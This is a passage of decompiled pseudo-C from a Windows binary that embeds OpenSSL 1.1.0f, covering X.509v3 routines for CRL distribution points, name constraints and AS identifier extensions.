  v3 = *(_DWORD **)(v2 + 16);
  if ( !v3 )
    return 0i64;
  if ( a2 )
    *a2 = *v3;
  return *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 296) + 16i64) + 8i64);
}

//----- (00000001400A5470) ----------------------------------------------------
__int64 __fastcall sub_1400A5470(__int64 a1)
{
  __int64 result; // rax

  result = *(_QWORD *)(a1 + 296);
  if ( result )
    return *(_QWORD *)(result + 8);
  return result;
}

//----- (00000001400A5490) ----------------------------------------------------
__int64 __fastcall sub_1400A5490(__int64 a1)
{
  __int64 result; // rax

  result = *(_QWORD *)(a1 + 296);
  if ( result )
    return *(_QWORD *)result;
  return result;
}

//----- (00000001400A54B0) ----------------------------------------------------
__int64 __fastcall sub_1400A54B0(__int64 a1, _DWORD *a2)
{
  __int64 v2; // rax
  _DWORD *v3; // rax

  v2 = *(_QWORD *)(a1 + 296);
  if ( !v2 )
    return 0i64;
  v3 = *(_DWORD **)(v2 + 24);
  if ( !v3 )
    return 0i64;
  if ( a2 )
    *a2 = *v3;
  return *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 296) + 24i64) + 8i64);
}

//----- (00000001400A54F0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400A54F0(__int64 a1)
{
  return *(_QWORD *)(a1 + 296) != 0i64;
}

//----- (00000001400A5500) ----------------------------------------------------
void __fastcall sub_1400A5500(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_14011A440);
}

//----- (00000001400A5520) ----------------------------------------------------
void *sub_1400A5520()
{
  return &unk_14011A440;
}

//----- (00000001400A5530) ----------------------------------------------------
__int64 sub_1400A5530()
{
  return sub_140050B70((__int64)&unk_14011A440);
}

//----- (00000001400A5550) ----------------------------------------------------
void *sub_1400A5550()
{
  return &unk_14011A540;
}

//----- (00000001400A5560) ----------------------------------------------------
void *sub_1400A5560()
{
  return &unk_14011A690;
}

//----- (00000001400A5570) ----------------------------------------------------
void *sub_1400A5570()
{
  return &unk_14011A4D0;
}

//----- (00000001400A5580) ----------------------------------------------------
void __fastcall sub_1400A5580(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_14011A6E0);
}

//----- (00000001400A55A0) ----------------------------------------------------
void *sub_1400A55A0()
{
  return &unk_14011A6E0;
}

//----- (00000001400A55B0) ----------------------------------------------------
__int64 sub_1400A55B0()
{
  return sub_140050B70((__int64)&unk_14011A6E0);
}

//----- (00000001400A55D0) ----------------------------------------------------
void __fastcall sub_1400A55D0(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_14011A690);
}

//----- (00000001400A55F0) ----------------------------------------------------
__int64 sub_1400A55F0()
{
  return sub_140050B70((__int64)&unk_14011A690);
}

//----- (00000001400A5610) ----------------------------------------------------
__int64 sub_1400A5610()
{
  return sub_140050B70((__int64)&unk_14011A4D0);
}

//----- (00000001400A5630) ----------------------------------------------------
int *__fastcall sub_1400A5630(__int64 a1, __int64 a2, unsigned int *a3)
{
  unsigned int *v6; // rbx
  unsigned int *v7; // rsi
  int *v8; // r15
  int v9; // ebp
  __int64 v10; // rax
  unsigned int *v11; // rax
  __int64 v12; // rbx
  unsigned int *v13; // rdi
  int *v15; // rax
  __int64 v16; // rax
  unsigned int *v17; // rdi
  __int64 v18; // rax

  v6 = 0i64;
  v7 = 0i64;
  v8 = (int *)sub_1400296C0();
  if ( !v8 )
  {
LABEL_8:
    sub_140024610(34, 134, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_crld.c", 288);
    goto LABEL_9;
  }
  v9 = 0;
  if ( (int)sub_1400296E0(a3) <= 0 )
    return v8;
  while ( 1 )
  {
    v10 = sub_140029880((__int64)a3, v9);
    if ( !*(_QWORD *)(v10 + 16) )
    {
      v11 = (unsigned int *)sub_1400BB7F0(a2);
      v12 = (__int64)v11;
      if ( !v11 || (v13 = (unsigned int *)sub_1400A5E20(a2, v11), sub_1400BB850(a2, v12), !v13) )
      {
        v6 = 0i64;
        v7 = 0i64;
        goto LABEL_9;
      }
      if ( !(unsigned int)sub_1400297C0(v8, (__int64)v13) )
      {
        sub_140051250(v13, (__int64)&unk_14011AA20);
        v6 = 0i64;
        v7 = 0i64;
        goto LABEL_8;
      }
      goto LABEL_17;
    }
    v7 = (unsigned int *)sub_1400BB4E0(a1, a2, v10);
    if ( !v7 )
      break;
    v15 = (int *)sub_1400A55B0();
    v6 = (unsigned int *)v15;
    if ( !v15 )
      goto LABEL_8;
    if ( !(unsigned int)sub_1400297C0(v15, (__int64)v7) )
      goto LABEL_8;
    v7 = 0i64;
    v16 = sub_140050B70((__int64)&unk_14011AA20);
    v17 = (unsigned int *)v16;
    if ( !v16 )
      goto LABEL_8;
    if ( !(unsigned int)sub_1400297C0(v8, v16) )
    {
      sub_140051250(v17, (__int64)&unk_14011AA20);
      goto LABEL_8;
    }
    v18 = sub_140050B70((__int64)&unk_14011A990);
    *(_QWORD *)v17 = v18;
    if ( !v18 )
      goto LABEL_8;
    *(_QWORD *)(v18 + 8) = v6;
    **(_DWORD **)v17 = 0;
LABEL_17:
    if ( ++v9 >= (int)sub_1400296E0(a3) )
      return v8;
  }
  v6 = 0i64;
LABEL_9:
  sub_1400A55D0(v7);
  sub_1400A5580(v6);
  sub_140029720(v8, (void (*)(void))sub_1400A5CF0);
  return 0i64;
}

//----- (00000001400A5820) ----------------------------------------------------
__int64 __fastcall sub_1400A5820(__int64 a1, unsigned int *a2, __int64 a3, unsigned int a4)
{
  int i; // edi
  __int64 v8; // rbx
  __int64 v9; // r8

  for ( i = 0; i < (int)sub_1400296E0(a2); ++i )
  {
    sub_14002A1A0(a3, (__int64)"\n");
    v8 = sub_140029880((__int64)a2, i);
    if ( *(_QWORD *)v8 )
      sub_1400A6000(a3, *(_QWORD *)v8, a4);
    v9 = *(_QWORD *)(v8 + 8);
    if ( v9 )
      sub_1400A6160(a3, (__int64)"Reasons", v9, a4);
    if ( *(_QWORD *)(v8 + 16) )
    {
      sub_14002A590(a3, "%*sCRL Issuer:\n", a4, byte_1400D7DAE);
      sub_1400A60B0(a3, *(unsigned int **)(v8 + 16), a4);
    }
  }
  return 1i64;
}

//----- (00000001400A5910) ----------------------------------------------------
void *sub_1400A5910()
{
  return &unk_14011AA70;
}

//----- (00000001400A5920) ----------------------------------------------------
void *sub_1400A5920()
{
  return &unk_14011AA20;
}

//----- (00000001400A5930) ----------------------------------------------------
__int64 __fastcall sub_1400A5930(int a1, __int64 *a2)
{
  __int64 v2; // r8
  int v3; // ecx

  v2 = *a2;
  v3 = a1 - 1;
  if ( v3 )
  {
    if ( v3 == 2 )
    {
      sub_1400A4C80(*(unsigned int **)(v2 + 16));
      return 1i64;
    }
  }
  else
  {
    *(_QWORD *)(v2 + 16) = 0i64;
  }
  return 1i64;
}

//----- (00000001400A5970) ----------------------------------------------------
void *sub_1400A5970()
{
  return &unk_14011A990;
}

//----- (00000001400A5980) ----------------------------------------------------
void *sub_1400A5980()
{
  return &unk_14011AB60;
}

//----- (00000001400A5990) ----------------------------------------------------
__int64 __fastcall sub_1400A5990(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  __int64 v6; // rdx
  __int64 v8; // r8

  v6 = *(_QWORD *)a2;
  if ( v6 )
    sub_1400A6000(a3, v6, a4);
  if ( *(int *)(a2 + 8) > 0 )
    sub_14002A590(a3, "%*sOnly User Certificates\n", a4, byte_1400D7DAE);
  if ( *(int *)(a2 + 12) > 0 )
    sub_14002A590(a3, "%*sOnly CA Certificates\n", a4, byte_1400D7DAE);
  if ( *(int *)(a2 + 24) > 0 )
    sub_14002A590(a3, "%*sIndirect CRL\n", a4, byte_1400D7DAE);
  v8 = *(_QWORD *)(a2 + 16);
  if ( v8 )
    sub_1400A6160(a3, (__int64)"Only Some Reasons", v8, a4);
  if ( *(int *)(a2 + 28) > 0 )
    sub_14002A590(a3, "%*sOnly Attribute Certificates\n", a4, byte_1400D7DAE);
  if ( !*(_QWORD *)a2
    && *(int *)(a2 + 8) <= 0
    && *(int *)(a2 + 12) <= 0
    && *(int *)(a2 + 24) <= 0
    && !*(_QWORD *)(a2 + 16)
    && *(int *)(a2 + 28) <= 0 )
  {
    sub_14002A590(a3, "%*s<EMPTY>\n", a4, byte_1400D7DAE);
  }
  return 1i64;
}

//----- (00000001400A5AB0) ----------------------------------------------------
__int64 __fastcall sub_1400A5AB0(__int64 a1, __int64 a2, unsigned int *a3)
{
  __int64 v5; // rdi
  int v6; // ebp
  _QWORD *v7; // rsi
  const char *v8; // rbx
  _BYTE *v9; // r14
  int v10; // eax
  unsigned int v11; // eax
  __int64 v12; // rcx
  char v13; // al
  __int64 v14; // rax
  char v15; // cl

  v5 = sub_140050B70((__int64)&unk_14011AB60);
  if ( !v5 )
  {
    sub_140024610(34, 157, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_crld.c", 406);
    goto LABEL_24;
  }
  v6 = 0;
  if ( (int)sub_1400296E0(a3) <= 0 )
    return v5;
  while ( 1 )
  {
    v7 = (_QWORD *)sub_140029880((__int64)a3, v6);
    v8 = (const char *)v7[1];
    v9 = (_BYTE *)v7[2];
    v10 = sub_1400A6240(v5, a2, (__int64)v7);
    if ( v10 <= 0 )
      break;
LABEL_21:
    if ( ++v6 >= (int)sub_1400296E0(a3) )
      return v5;
  }
  if ( v10 < 0 )
    goto LABEL_24;
  if ( !strcmp(v8, "onlyuser") )
  {
    v11 = sub_1400B8590(v7, (_DWORD *)(v5 + 8));
    goto LABEL_20;
  }
  v12 = 0i64;
  while ( 1 )
  {
    v13 = v8[v12++];
    if ( v13 != aOnlyca[v12 - 1] )
      break;
    if ( v12 == 7 )
    {
      v11 = sub_1400B8590(v7, (_DWORD *)(v5 + 12));
      goto LABEL_20;
    }
  }
  v14 = 0i64;
  while ( 1 )
  {
    v15 = v8[v14++];
    if ( v15 != aOnlyaa[v14 - 1] )
      break;
    if ( v14 == 7 )
    {
      v11 = sub_1400B8590(v7, (_DWORD *)(v5 + 28));
      goto LABEL_20;
    }
  }
  if ( !strcmp(v8, "indirectCRL") )
  {
    v11 = sub_1400B8590(v7, (_DWORD *)(v5 + 24));
    goto LABEL_20;
  }
  if ( !strcmp(v8, "onlysomereasons") )
  {
    v11 = (unsigned int)sub_1400A6430((int **)(v5 + 16), v9);
LABEL_20:
    if ( !v11 )
      goto LABEL_24;
    goto LABEL_21;
  }
  sub_140024610(34, 157, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_crld.c", 398);
  sub_140023A40(6, "section:", *v7, ",name:", v7[1], ",value:", v7[2]);
LABEL_24:
  sub_140051250((unsigned int *)v5, (__int64)&unk_14011AB60);
  return 0i64;
}

//----- (00000001400A5CD0) ----------------------------------------------------
void __fastcall sub_1400A5CD0(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_14011AA70);
}

//----- (00000001400A5CF0) ----------------------------------------------------
void __fastcall sub_1400A5CF0(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_14011AA20);
}

//----- (00000001400A5D10) ----------------------------------------------------
__int64 __fastcall sub_1400A5D10(__int64 a1, unsigned int *a2)
{
  unsigned int *v3; // rsi
  __int64 result; // rax
  int v5; // ebx
  unsigned int *v6; // rax

  if ( !a1 || *(_DWORD *)a1 != 1 )
    return 1i64;
  v3 = *(unsigned int **)(a1 + 8);
  result = sub_1400A4C60(a2);
  *(_QWORD *)(a1 + 16) = result;
  if ( !result )
    return result;
  v5 = 0;
  if ( (int)sub_1400296E0(v3) > 0 )
  {
    do
    {
      v6 = (unsigned int *)sub_140029880((__int64)v3, v5);
      if ( !(unsigned int)sub_1400ABB70(*(_QWORD *)(a1 + 16), v6, -1, v5 == 0) )
        goto LABEL_8;
    }
    while ( ++v5 < (int)sub_1400296E0(v3) );
  }
  if ( (int)sub_1400A4F80(*(unsigned int **)(a1 + 16), 0i64) < 0 )
  {
LABEL_8:
    sub_1400A4C80(*(unsigned int **)(a1 + 16));
    result = 0i64;
    *(_QWORD *)(a1 + 16) = 0i64;
    return result;
  }
  return 1i64;
}

//----- (00000001400A5E00) ----------------------------------------------------
void __fastcall sub_1400A5E00(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_14011AB60);
}

//----- (00000001400A5E20) ----------------------------------------------------
__int64 __fastcall sub_1400A5E20(__int64 a1, unsigned int *a2)
{
  __int64 v4; // rbx
  int v5; // esi
  __int64 v6; // rdi
  int v7; // eax
  __int64 v8; // rcx
  char v9; // al
  bool v10; // zf
  int *v11; // rax

  v4 = sub_140050B70((__int64)&unk_14011AA20);
  if ( v4 )
  {
    v5 = 0;
    if ( (int)sub_1400296E0(a2) <= 0 )
      return v4;
    while ( 1 )
    {
      v6 = sub_140029880((__int64)a2, v5);
      v7 = sub_1400A6240(v4, a1, v6);
      if ( v7 <= 0 )
      {
        if ( v7 < 0 )
          break;
        v8 = 0i64;
        while ( 1 )
        {
          v9 = *(_BYTE *)(*(_QWORD *)(v6 + 8) + v8++);
          if ( v9 != aReasons_0[v8 - 1] )
            break;
          if ( v8 == 8 )
          {
            v10 = (unsigned int)sub_1400A6430((int **)(v4 + 8), *(_BYTE **)(v6 + 16)) == 0;
            goto LABEL_11;
          }
        }
        if ( strcmp(*(const char **)(v6 + 8), "CRLissuer") )
          goto LABEL_12;
        v11 = sub_1400A5F40(a1, *(_BYTE **)(v6 + 16));
        *(_QWORD *)(v4 + 16) = v11;
        v10 = v11 == 0i64;
LABEL_11:
        if ( v10 )
          break;
      }
LABEL_12:
      if ( ++v5 >= (int)sub_1400296E0(a2) )
        return v4;
    }
  }
  sub_140051250((unsigned int *)v4, (__int64)&unk_14011AA20);
  return 0i64;
}

//----- (00000001400A5F40) ----------------------------------------------------
int *__fastcall sub_1400A5F40(__int64 a1, _BYTE *a2)
{
  unsigned int *v4; // rax
  unsigned int *v5; // rbx
  int *v7; // rbp

  if ( *a2 == 64 )
    v4 = (unsigned int *)sub_1400BB7F0(a1);
  else
    v4 = (unsigned int *)sub_1400B8890(a2);
  v5 = v4;
  if ( v4 )
  {
    v7 = sub_1400BB510(0i64, a1, v4);
    if ( *a2 == 64 )
      sub_1400BB850(a1, (__int64)v5);
    else
      sub_140029720(v5, (void (*)(void))sub_1400B8520);
    return v7;
  }
  else
  {
    sub_140024610(34, 156, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_crld.c", 55);
    return 0i64;
  }
}

//----- (00000001400A6000) ----------------------------------------------------
__int64 __fastcall sub_1400A6000(__int64 a1, __int64 a2, int a3)
{
  unsigned int *v7; // [rsp+30h] [rbp-38h] BYREF

  if ( *(_DWORD *)a2 )
  {
    v7 = *(unsigned int **)(a2 + 8);
    sub_14002A590(a1, "%*sRelative Name:\n%*s", a3, byte_1400D7DAE, a3 + 2, byte_1400D7DAE);
    sub_14005F0A0(a1, &v7, 0, 8520479);
    sub_14002A1A0(a1, (__int64)"\n");
  }
  else
  {
    sub_14002A590(a1, "%*sFull Name:\n", a3, byte_1400D7DAE);
    sub_1400A60B0(a1, *(unsigned int **)(a2 + 8), a3);
  }
  return 1i64;
}

//----- (00000001400A60B0) ----------------------------------------------------
__int64 __fastcall sub_1400A60B0(__int64 a1, unsigned int *a2, int a3)
{
  int i; // ebx
  __int64 v7; // rax

  for ( i = 0; i < (int)sub_1400296E0(a2); ++i )
  {
    sub_14002A590(a1, "%*s", (unsigned int)(a3 + 2), byte_1400D7DAE);
    v7 = sub_140029880((__int64)a2, i);
    sub_1400BA900(a1, v7);
    sub_14002A1A0(a1, (__int64)"\n");
  }
  return 1i64;
}

//----- (00000001400A6160) ----------------------------------------------------
__int64 __fastcall sub_1400A6160(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  int v4; // eax
  int v5; // esi
  __int64 *v8; // rbx
  const char *v9; // rdx

  v5 = v4 - 63;
  sub_14002A590(a1, "%*s%s:\n%*s", a4);
  if ( !"Unused" )
    goto LABEL_10;
  v8 = (__int64 *)off_14011A838;
  do
  {
    if ( sub_140082730(a3, *((_DWORD *)v8 - 2)) )
    {
      if ( v5 )
        v5 = 0;
      else
        sub_14002A1A0(a1, (__int64)", ");
      sub_14002A1A0(a1, *v8);
    }
    v8 += 3;
  }
  while ( *v8 );
  v9 = "\n";
  if ( v5 )
LABEL_10:
    v9 = "<EMPTY>\n";
  sub_14002A1A0(a1, (__int64)v9);
  return 1i64;
}
// 1400A617B: variable 'v4' is possibly undefined
// 14011A838: using guessed type char *off_14011A838[2];

//----- (00000001400A6240) ----------------------------------------------------
__int64 __fastcall sub_1400A6240(__int64 a1, __int64 a2, __int64 a3)
{
  int v3; // eax
  int *v7; // rsi
  void *v8; // rdi
  __int64 result; // rax
  unsigned int *v10; // r15
  unsigned int *v11; // rax
  __int64 v12; // rdi
  int v13; // ebx
  int v14; // eax
  _DWORD *v15; // rax

  v7 = 0i64;
  v8 = 0i64;
  if ( !strncmp(*(const char **)(a3 + 8), "fullname", (unsigned int)(v3 - 39)) )
  {
    v7 = sub_1400A5F40(a2, *(_BYTE **)(a3 + 16));
    if ( !v7 )
    {
LABEL_5:
      sub_140029720(v7, (void (*)(void))sub_1400A55D0);
      sub_140029720(v8, (void (*)(void))sub_1400A4C20);
      return 0xFFFFFFFFi64;
    }
    goto LABEL_3;
  }
  if ( strcmp(*(const char **)(a3 + 8), "relativename") )
    return 0i64;
  v10 = (unsigned int *)sub_1400A4CB0();
  if ( !v10 )
    return 0xFFFFFFFFi64;
  v11 = (unsigned int *)sub_1400BB7F0(a2);
  v12 = (__int64)v11;
  if ( !v11 )
  {
    sub_140024610(34, 158, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_crld.c", 86);
    return 0xFFFFFFFFi64;
  }
  v13 = sub_1400B81E0((__int64)v10, v11, 4097);
  sub_1400BB850(a2, v12);
  v8 = *(void **)v10;
  *(_QWORD *)v10 = 0i64;
  sub_1400A4C80(v10);
  if ( !v13 || (int)sub_1400296E0((unsigned int *)v8) <= 0 )
    goto LABEL_5;
  v14 = sub_1400296E0((unsigned int *)v8);
  if ( *(_DWORD *)(sub_140029880((__int64)v8, v14 - 1) + 16) )
  {
    sub_140024610(34, 158, 161, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_crld.c", 102);
    goto LABEL_5;
  }
LABEL_3:
  if ( *(_QWORD *)a1 )
  {
    sub_140024610(34, 158, 160, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_crld.c", 110);
    goto LABEL_5;
  }
  v15 = (_DWORD *)sub_140050B70((__int64)&unk_14011A990);
  *(_QWORD *)a1 = v15;
  if ( !v15 )
    goto LABEL_5;
  if ( v7 )
  {
    *v15 = 0;
    *(_QWORD *)(*(_QWORD *)a1 + 8i64) = v7;
    return 1i64;
  }
  else
  {
    *v15 = 1;
    result = 1i64;
    *(_QWORD *)(*(_QWORD *)a1 + 8i64) = v8;
  }
  return result;
}
// 1400A626A: variable 'v3' is possibly undefined

//----- (00000001400A6430) ----------------------------------------------------
int *__fastcall sub_1400A6430(int **a1, _BYTE *a2)
{
  unsigned int v3; // r15d
  int *result; // rax
  unsigned int *v5; // rbp
  int v6; // esi
  __int64 v7; // rdi
  int *v8; // rax
  _QWORD *v9; // rbx
  unsigned __int8 *v10; // rax
  __int64 v11; // r8
  int v12; // ecx
  int v13; // edx

  v3 = 0;
  result = sub_1400B8890(a2);
  v5 = (unsigned int *)result;
  if ( result )
  {
    if ( !*a1 )
    {
      v6 = 0;
      if ( (int)sub_1400296E0((unsigned int *)result) <= 0 )
      {
LABEL_16:
        v3 = 1;
      }
      else
      {
        while ( 1 )
        {
          v7 = *(_QWORD *)(sub_140029880((__int64)v5, v6) + 8);
          if ( !*a1 )
          {
            v8 = sub_14004FDA0();
            *a1 = v8;
            if ( !v8 )
              break;
          }
          v9 = &unk_14011A830;
          if ( "Unused" )
          {
            while ( 1 )
            {
              v10 = (unsigned __int8 *)v9[2];
              v11 = v7 - (_QWORD)v10;
              do
              {
                v12 = v10[v11];
                v13 = *v10 - v12;
                if ( v13 )
                  break;
                ++v10;
              }
              while ( v12 );
              if ( !v13 )
                break;
              v9 += 3;
              if ( !v9[1] )
                goto LABEL_14;
            }
            if ( !(unsigned int)sub_140082780(*a1, *(_DWORD *)v9, 1) )
              break;
          }
LABEL_14:
          if ( !v9[1] )
            break;
          if ( ++v6 >= (int)sub_1400296E0(v5) )
            goto LABEL_16;
        }
      }
    }
    sub_140029720(v5, (void (*)(void))sub_1400B8520);
    return (int *)v3;
  }
  return result;
}

//----- (00000001400A6570) ----------------------------------------------------
unsigned int *__fastcall sub_1400A6570(__int64 a1, __int64 a2, unsigned int *a3)
{
  unsigned int *v6; // rdi
  unsigned int *v7; // rbp
  int i; // esi
  __int64 v9; // rdi
  __int64 v10; // rax
  int **v11; // rbx
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 *v14; // rax
  int *v15; // rax
  char v17[8]; // [rsp+30h] [rbp-38h] BYREF
  __int64 v18; // [rsp+38h] [rbp-30h]
  __int64 v19; // [rsp+40h] [rbp-28h]

  v6 = 0i64;
  v7 = (unsigned int *)sub_140050B70((__int64)&unk_14011B1D0);
  if ( v7 )
  {
    for ( i = 0; i < (int)sub_1400296E0(a3); ++i )
    {
      v9 = sub_140029880((__int64)a3, i);
      if ( !strncmp(*(const char **)(v9 + 8), "permitted", 9ui64) && (v10 = *(_QWORD *)(v9 + 8), *(_BYTE *)(v10 + 9)) )
      {
        v11 = (int **)v7;
        v12 = v10 + 10;
      }
      else
      {
        if ( strncmp(*(const char **)(v9 + 8), "excluded", 8ui64) || (v13 = *(_QWORD *)(v9 + 8), !*(_BYTE *)(v13 + 8)) )
        {
          sub_140024610(34, 147, 143, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_ncons.c", 86);
          v6 = 0i64;
          goto LABEL_18;
        }
        v11 = (int **)(v7 + 2);
        v12 = v13 + 9;
      }
      v18 = v12;
      v19 = *(_QWORD *)(v9 + 16);
      v14 = (__int64 *)sub_140050B70((__int64)&unk_14011B160);
      v6 = (unsigned int *)v14;
      if ( !v14 )
        goto LABEL_17;
      if ( !sub_1400BB5F0(*v14, a1, a2, (__int64)v17, 1) )
        goto LABEL_18;
      if ( !*v11 )
      {
        v15 = (int *)sub_1400296C0();
        *v11 = v15;
        if ( !v15 )
          goto LABEL_17;
      }
      if ( !(unsigned int)sub_1400297C0(*v11, (__int64)v6) )
        goto LABEL_17;
    }
    return v7;
  }
  else
  {
LABEL_17:
    sub_140024610(34, 147, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_ncons.c", 105);
LABEL_18:
    sub_140051250(v7, (__int64)&unk_14011B1D0);
    sub_140051250(v6, (__int64)&unk_14011B160);
    return 0i64;
  }
}
// 1400A6570: using guessed type char var_38[8];

//----- (00000001400A6740) ----------------------------------------------------
__int64 __fastcall sub_1400A6740(__int64 a1, unsigned int **a2, __int64 a3, unsigned int a4)
{
  sub_1400A6800(a1, *a2, a3, a4, (__int64)"Permitted");
  sub_1400A6800(a1, a2[1], a3, a4, (__int64)"Excluded");
  return 1i64;
}

//----- (00000001400A67C0) ----------------------------------------------------
void *sub_1400A67C0()
{
  return &unk_14011B160;
}

//----- (00000001400A67D0) ----------------------------------------------------
void *sub_1400A67D0()
{
  return &unk_14011B1D0;
}

//----- (00000001400A67E0) ----------------------------------------------------
void __fastcall sub_1400A67E0(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_14011B1D0);
}

//----- (00000001400A6800) ----------------------------------------------------
__int64 __fastcall sub_1400A6800(__int64 a1, unsigned int *a2, __int64 a3, unsigned int a4, __int64 a5)
{
  int v8; // ebp
  unsigned int v9; // r15d
  _DWORD **v10; // rbx
  _DWORD *v11; // rdx
  int *v12; // rax
  unsigned __int8 *v13; // rsi
  int v14; // ebx
  int v15; // ebx
  __int16 *v16; // rdx
  __int64 v18; // [rsp+20h] [rbp-48h]
  __int64 v19; // [rsp+28h] [rbp-40h]
  __int64 v20; // [rsp+30h] [rbp-38h]
  __int64 v21; // [rsp+38h] [rbp-30h]
  __int64 v22; // [rsp+40h] [rbp-28h]
  __int64 v23; // [rsp+48h] [rbp-20h]

  if ( (int)sub_1400296E0(a2) > 0 )
    sub_14002A590(a3, "%*s%s:\n", a4, byte_1400D7DAE, a5);
  v8 = 0;
  if ( (int)sub_1400296E0(a2) > 0 )
  {
    v9 = a4 + 2;
    while ( 1 )
    {
      v10 = (_DWORD **)sub_140029880((__int64)a2, v8);
      sub_14002A590(a3, "%*s", v9, byte_1400D7DAE);
      v11 = *v10;
      if ( **v10 != 7 )
      {
        sub_1400BA900(a3, (__int64)v11);
        goto LABEL_19;
      }
      v12 = (int *)*((_QWORD *)v11 + 1);
      v13 = (unsigned __int8 *)*((_QWORD *)v12 + 1);
      v14 = *v12;
      sub_14002A1A0(a3, (__int64)"IP:");
      if ( v14 != 8 )
        break;
      LODWORD(v23) = v13[7];
      LODWORD(v22) = v13[6];
      LODWORD(v21) = v13[5];
      LODWORD(v20) = v13[4];
      LODWORD(v19) = v13[3];
      LODWORD(v18) = v13[2];
      sub_14002A590(a3, "%d.%d.%d.%d/%d.%d.%d.%d", *v13, v13[1], v18, v19, v20, v21, v22, v23);
LABEL_19:
      sub_14002A1A0(a3, (__int64)"\n");
      if ( ++v8 >= (int)sub_1400296E0(a2) )
        return 1i64;
    }
    if ( v14 != 32 )
    {
      sub_14002A590(a3, "IP Address:<invalid>");
      goto LABEL_19;
    }
    v15 = 0;
    while ( 1 )
    {
      sub_14002A590(a3, "%X", v13[1] | (*v13 << 8));
      v13 += 2;
      if ( v15 == 7 )
        break;
      if ( v15 != 15 )
      {
        v16 = word_1400F6B40;
        goto LABEL_14;
      }
LABEL_15:
      if ( ++v15 >= 16 )
        goto LABEL_19;
    }
    v16 = (__int16 *)"/";
LABEL_14:
    sub_14002A1A0(a3, (__int64)v16);
    goto LABEL_15;
  }
  return 1i64;
}
// 1400A6908: variable 'v18' is possibly undefined
// 1400A6908: variable 'v19' is possibly undefined
// 1400A6908: variable 'v20' is possibly undefined
// 1400A6908: variable 'v21' is possibly undefined
// 1400A6908: variable 'v22' is possibly undefined
// 1400A6908: variable 'v23' is possibly undefined
// 1400F6B40: using guessed type __int16 word_1400F6B40[16];

//----- (00000001400A69D0) ----------------------------------------------------
void *sub_1400A69D0()
{
  return &unk_14011B3D0;
}

//----- (00000001400A69E0) ----------------------------------------------------
void *sub_1400A69E0()
{
  return &unk_14011B440;
}

//----- (00000001400A69F0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400A69F0(__int64 a1, __int64 *a2, __int64 a3, int a4)
{
  return (unsigned int)sub_1400A78D0(a3, *a2, a4, "Autonomous System Numbers")
      && (unsigned int)sub_1400A78D0(a3, a2[1], a4, "Routing Domain Identifiers");
}

//----- (00000001400A6A70) ----------------------------------------------------
void *sub_1400A6A70()
{
  return &unk_14011B4B0;
}

//----- (00000001400A6A80) ----------------------------------------------------
void *sub_1400A6A80()
{
  return &unk_14011B520;
}

//----- (00000001400A6A90) ----------------------------------------------------
__int64 *__fastcall sub_1400A6A90(__int64 a1, __int64 a2, unsigned int *a3)
{
  __int64 *v4; // r12
  int v6; // r15d
  __int64 v7; // rbx
  int v8; // ebp
  __int64 v9; // rax
  char v10; // cl
  _DWORD *v11; // rbx
  int v12; // esi
  __int64 v13; // r14
  _BYTE *v14; // rcx
  int v15; // edi
  __int64 v16; // rax
  int v17; // edi
  __int64 v18; // rsi
  int v19; // eax
  _BYTE *v20; // rcx
  char *v21; // rax
  char *v22; // rdi
  _DWORD *v23; // [rsp+88h] [rbp+20h] BYREF

  v23 = 0i64;
  v4 = (__int64 *)sub_140050B70((__int64)&unk_14011B520);
  if ( !v4 )
  {
    sub_140024610(34, 163, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c", 505);
    return 0i64;
  }
  v6 = 0;
  if ( (int)sub_1400296E0(a3) > 0 )
  {
    while ( 2 )
    {
      v7 = sub_140029880((__int64)a3, v6);
      if ( sub_1400B9240(*(const char **)(v7 + 8), "AS") )
      {
        if ( sub_1400B9240(*(const char **)(v7 + 8), "RDI") )
        {
          sub_140024610(34, 163, 115, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c", 522);
LABEL_13:
          sub_140023A40(6, "section:", *(_QWORD *)v7, ",name:", *(_QWORD *)(v7 + 8), ",value:", *(_QWORD *)(v7 + 16));
          goto LABEL_14;
        }
        v8 = 1;
      }
      else
      {
        v8 = 0;
      }
      v9 = 0i64;
      while ( 1 )
      {
        v10 = *(_BYTE *)(*(_QWORD *)(v7 + 16) + v9++);
        if ( v10 != aInherit[v9 - 1] )
          break;
        if ( v9 == 8 )
        {
          if ( !(unsigned int)sub_1400A7820((__int64)v4, v8) )
          {
            sub_140024610(34, 163, 165, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c", 534);
            goto LABEL_13;
          }
          goto LABEL_28;
        }
      }
      v12 = unknown_libname_31(*(_QWORD *)(v7 + 16), "0123456789");
      v13 = v12;
      v14 = (_BYTE *)(v12 + *(_QWORD *)(v7 + 16));
      if ( *v14 )
      {
        v15 = v12 + unknown_libname_31(v14, " \t");
        v16 = *(_QWORD *)(v7 + 16);
        if ( *(_BYTE *)(v15 + v16) != 45 )
        {
          sub_140024610(34, 163, 162, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_asid.c", 550);
          goto LABEL_13;
        }
        v17 = unknown_libname_31(v16 + v15 + 1, " \t") + v15 + 1;
        v18 = v17;
